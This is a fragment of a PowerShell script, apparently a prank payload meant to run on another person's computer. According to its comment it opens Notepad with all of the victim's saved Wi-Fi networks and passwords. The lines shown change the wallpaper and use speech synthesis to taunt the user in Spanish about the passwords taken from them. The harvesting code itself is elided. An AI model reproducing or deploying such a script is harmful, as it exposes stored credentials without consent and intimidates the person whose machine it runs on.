...
# This will open up notepad with all their saved networks and passwords and taunt them
	...
	$s.Speak("¿Quieres ver algo realmente genial?")
	Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
	$s.Speak("Mira todas tus otras contraseñas que tengo...")
	Start-Sleep -Seconds 1
	$s.Speak("¡Estas son las contraseñas wifi para todas las redes a las que te has conectado!")
	Start-Sleep -Seconds 1
	$s.Speak("Podría enviarlos a mí mismo pero no quiero")
...
$intro = "$fullName , Ha pasado mucho tiempo mi amigo"
